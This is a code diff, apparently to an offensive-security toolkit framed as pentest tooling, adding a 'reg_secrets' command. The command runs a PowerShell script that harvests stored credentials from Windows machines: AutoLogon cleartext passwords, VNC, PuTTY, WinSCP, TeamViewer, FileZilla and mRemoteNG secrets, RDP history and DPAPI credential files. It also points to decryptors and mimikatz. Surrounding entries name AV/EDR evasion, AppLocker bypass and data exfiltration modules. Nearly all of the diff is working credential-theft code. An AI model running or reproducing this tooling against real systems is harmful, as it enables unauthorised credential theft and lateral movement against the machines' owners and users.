@@ -487,6 +487,11 @@ const PROGRAMS = {
       "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
     args: "[--mode base64|amsi|obfuscate|all]",
   },
+  reg_secrets: {
+    description:
+      "Registry credential extraction — harvest stored credentials from registry: AutoLogon (DefaultPassword), WinLogon, VNC passwords, PuTTY saved sessions and SSH host keys, WinSCP stored passwords, RDP connection history, service account credentials, TeamViewer passwords, FileZilla saved servers, and custom application credential storage. Comprehensive registry-based credential sweep",
+    args: "--action full|autologon|vnc|putty|winscp|rdp|services|apps",
+  },
   screenshot_grab: {
     description:
       "Screen and visual capture — take screenshots of all monitors, capture active window, optional webcam snapshot via DirectShow API. Used for visual intelligence gathering and proving access during pentest engagements",
@@ -13890,6 +13895,233 @@ async function stealthCheck(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings }
 }
 
+async function regSecrets(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "full"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Registry credential extraction...\n"]
+
+  const script = `
+$credFinds = @()
+
+if ('${action}' -eq 'autologon' -or '${action}' -eq 'full') {
+    Write-Output "=== AutoLogon Credentials ==="
+    $winlogon = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+    $defaultUser = (Get-ItemProperty $winlogon -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
+    $defaultPass = (Get-ItemProperty $winlogon -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
+    $defaultDomain = (Get-ItemProperty $winlogon -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
+    $autoAdmin = (Get-ItemProperty $winlogon -Name AutoAdminLogon -ErrorAction SilentlyContinue).AutoAdminLogon
+
+    if ($defaultPass) {
+        Write-Output "[!!!] AutoLogon ENABLED with cleartext password!"
+        Write-Output "    Domain: $defaultDomain"
+        Write-Output "    Username: $defaultUser"
+        Write-Output "    Password: $defaultPass"
+        Write-Output "    AutoAdminLogon: $autoAdmin"
+        $credFinds += "AutoLogon:$defaultDomain\\$defaultUser"
+    } elseif ($defaultUser) {
+        Write-Output "[*] AutoLogon user set but no cleartext password (LSA secret)"
+        Write-Output "    Username: $defaultUser"
+    } else {
+        Write-Output "[-] No AutoLogon configured"
+    }
+    Write-Output ""
+}
+
+if ('${action}' -eq 'vnc' -or '${action}' -eq 'full') {
+    Write-Output "=== VNC Passwords ==="
+    $vncPaths = @(
+        "HKLM:\\SOFTWARE\\RealVNC\\vncserver",
+        "HKLM:\\SOFTWARE\\RealVNC\\WinVNC4",
+        "HKCU:\\SOFTWARE\\RealVNC\\vncserver",
+        "HKLM:\\SOFTWARE\\TightVNC\\Server",
+        "HKCU:\\SOFTWARE\\TightVNC\\Server",
+        "HKLM:\\SOFTWARE\\ORL\\WinVNC3",
+        "HKLM:\\SOFTWARE\\ORL\\WinVNC\\Default"
+    )
+    foreach ($path in $vncPaths) {
+        if (Test-Path $path) {
+            $pass = (Get-ItemProperty $path -Name Password -ErrorAction SilentlyContinue).Password
+            if ($pass) {
+                $hex = ($pass | ForEach-Object { $_.ToString("X2") }) -join ''
+                Write-Output "[!!!] VNC password found at $path"
+                Write-Output "    Encrypted: $hex"
+                Write-Output "    Decrypt with: vncpwd.exe or MSF vnc_decrypt"
+                $credFinds += "VNC:$path"
+            }
+        }
+    }
+    if (-not ($credFinds | Where-Object { $_ -match 'VNC' })) { Write-Output "[-] No VNC passwords found" }
+    Write-Output ""
+}
+
+if ('${action}' -eq 'putty' -or '${action}' -eq 'full') {
+    Write-Output "=== PuTTY Saved Sessions ==="
+    $puttyPath = "HKCU:\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions"
+    if (Test-Path $puttyPath) {
+        $sessions = Get-ChildItem $puttyPath -ErrorAction SilentlyContinue
+        foreach ($s in $sessions) {
+            $props = Get-ItemProperty $s.PSPath -ErrorAction SilentlyContinue
+            Write-Output "[+] Session: $($s.PSChildName)"
+            Write-Output "    Host: $($props.HostName):$($props.PortNumber)"
+            Write-Output "    Username: $($props.UserName)"
+            Write-Output "    Protocol: $($props.Protocol)"
+            if ($props.ProxyUsername) { Write-Output "    Proxy user: $($props.ProxyUsername)" }
+            if ($props.ProxyPassword) {
+                Write-Output "    [!!!] Proxy password: $($props.ProxyPassword)"
+                $credFinds += "PuTTY-Proxy:$($s.PSChildName)"
+            }
+            if ($props.PublicKeyFile) { Write-Output "    Key file: $($props.PublicKeyFile)" }
+        }
+    } else {
+        Write-Output "[-] No PuTTY sessions found"
+    }
+
+    $sshHostKeys = "HKCU:\\SOFTWARE\\SimonTatham\\PuTTY\\SshHostKeys"
+    if (Test-Path $sshHostKeys) {
+        $keys = Get-ItemProperty $sshHostKeys -ErrorAction SilentlyContinue
+        $keyCount = ($keys.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' }).Count
+        Write-Output "[*] SSH host keys cached: $keyCount (reveals previously accessed hosts)"
+    }
+    Write-Output ""
+}
+
+if ('${action}' -eq 'winscp' -or '${action}' -eq 'full') {
+    Write-Output "=== WinSCP Saved Credentials ==="
+    $winscpPath = "HKCU:\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions"
+    if (Test-Path $winscpPath) {
+        $sessions = Get-ChildItem $winscpPath -ErrorAction SilentlyContinue
+        foreach ($s in $sessions) {
+            $props = Get-ItemProperty $s.PSPath -ErrorAction SilentlyContinue
+            if ($props.HostName) {
+                Write-Output "[+] Session: $($s.PSChildName)"
+                Write-Output "    Host: $($props.HostName):$($props.PortNumber)"
+                Write-Output "    Username: $($props.UserName)"
+                if ($props.Password) {
+                    Write-Output "    [!!!] Encrypted password present"
+                    Write-Output "    Decrypt with: winscppasswd or MSF winscp_creds"
+                    $credFinds += "WinSCP:$($props.HostName)"
+                }
+            }
+        }
+    } else {
+        Write-Output "[-] No WinSCP sessions found"
+    }
+    Write-Output ""
+}
+
+if ('${action}' -eq 'rdp' -or '${action}' -eq 'full') {
+    Write-Output "=== RDP Connection History ==="
+    $rdpPath = "HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client"
+    $servers = "HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers"
+    if (Test-Path $servers) {
+        $hosts = Get-ChildItem $servers -ErrorAction SilentlyContinue
+        foreach ($h in $hosts) {
+            $props = Get-ItemProperty $h.PSPath -ErrorAction SilentlyContinue
+            Write-Output "[+] $($h.PSChildName) — Username: $($props.UsernameHint)"
+        }
+    }
+    $mru = Get-ItemProperty "$rdpPath\\Default" -Name "MRU*" -ErrorAction SilentlyContinue
+    if ($mru) {
+        Write-Output "[*] Recent RDP connections (MRU):"
+        $mru.PSObject.Properties | Where-Object { $_.Name -match 'MRU' } | ForEach-Object {
+            Write-Output "    $($_.Value)"
+        }
+    }
+    if (-not (Test-Path $servers)) { Write-Output "[-] No RDP history found" }
+    Write-Output ""
+}
+
+if ('${action}' -eq 'services' -or '${action}' -eq 'full') {
+    Write-Output "=== Service Account Credentials ==="
+    $services = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | Where-Object {
+        $_.StartName -and $_.StartName -notmatch 'LocalSystem|LocalService|NetworkService|NT AUTHORITY'
+    }
+    if ($services) {
+        foreach ($svc in $services) {
+            Write-Output "[+] $($svc.Name) — RunAs: $($svc.StartName)"
+            Write-Output "    Binary: $($svc.PathName)"
+        }
+        Write-Output ""
+        Write-Output "[*] Service accounts may have cached credentials in LSA secrets"
+        Write-Output "[*] Extract with: winhook lsass_dump or mimikatz lsadump::secrets"
+    } else {
+        Write-Output "[-] No custom service accounts found"
+    }
+    Write-Output ""
+}
+
+if ('${action}' -eq 'apps' -or '${action}' -eq 'full') {
+    Write-Output "=== Application Credentials ==="
+
+    $teamviewer = "HKLM:\\SOFTWARE\\TeamViewer","HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer"
+    foreach ($tv in $teamviewer) {
+        if (Test-Path $tv) {
+            $props = Get-ItemProperty $tv -ErrorAction SilentlyContinue
+            Write-Output "[+] TeamViewer found"
+            if ($props.ClientID) { Write-Output "    Client ID: $($props.ClientID)" }
+            if ($props.SecurityPasswordAES) {
+                Write-Output "    [!!!] AES-encrypted password present"
+                $credFinds += "TeamViewer"
+            }
+        }
+    }
+
+    $filezilla = "$env:APPDATA\\FileZilla\\sitemanager.xml","$env:APPDATA\\FileZilla\\recentservers.xml"
+    foreach ($fz in $filezilla) {
+        if (Test-Path $fz) {
+            $content = Get-Content $fz -Raw -ErrorAction SilentlyContinue
+            if ($content -match '<Pass[^>]*>([^<]+)</Pass>') {
+                Write-Output "[!!!] FileZilla saved credentials: $fz"
+                $credFinds += "FileZilla:$fz"
+            }
+        }
+    }
+
+    $mRemoteNG = "$env:APPDATA\\mRemoteNG\\confCons.xml"
+    if (Test-Path $mRemoteNG) {
+        Write-Output "[!!!] mRemoteNG config found: $mRemoteNG"
+        Write-Output "    Decrypt with: mremoteng_decrypt or MSF mremoteng_creds"
+        $credFinds += "mRemoteNG"
+    }
+
+    $mobilePasses = @(
+        "$env:LOCALAPPDATA\\Microsoft\\Credentials",
+        "$env:APPDATA\\Microsoft\\Credentials"
+    )
+    foreach ($mp in $mobilePasses) {
+        if (Test-Path $mp) {
+            $creds = Get-ChildItem $mp -ErrorAction SilentlyContinue
+            if ($creds) {
+                Write-Output "[*] Windows Credential files ($($creds.Count)): $mp"
+                Write-Output "    Decrypt with: winhook dpapi_extract"
+            }
+        }
+    }
+    Write-Output ""
+}
+
+Write-Output "=== Credential Summary ==="
+Write-Output "[*] Total credential findings: $($credFinds.Count)"
+foreach ($cf in $credFinds) { Write-Output "    [!] $cf" }
+`
+
+  const r = await ps(script, timeout)
+  output.push(r.stdout)
+  if (r.stderr) output.push(`[!] ${r.stderr}`)
+  findings.push({
+    checkId: "WIN-REGSEC-001",
+    provider: "windows",
+    severity: r.stdout.includes("!!!") ? "critical" : "medium",
+    status: r.stdout.includes("!!!") ? "VULNERABLE" : "CHECKED",
+    resource: "registry://credentials",
+    title: "Registry credential sweep — AutoLogon, VNC, PuTTY, WinSCP, services, apps",
+    details: r.stdout.substring(0, 500),
+    remediation: "Remove cleartext passwords from registry. Disable AutoLogon. Use credential managers with encryption.",
+  })
+
+  return { output: output.join("\n"), findings }
+}
+
 async function screenshotGrab(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "screen"
   const outputPath = argVal(args, "--output") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-capture-${Date.now()}`
@@ -20070,6 +20302,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   backup_operator_abuse: backupOperatorAbuse,
   applocker_bypass: applockerBypass,
   stealth_check: stealthCheck,
+  reg_secrets: regSecrets,
   screenshot_grab: screenshotGrab,
   share_hunt: shareHunt,
   data_exfil: dataExfil,
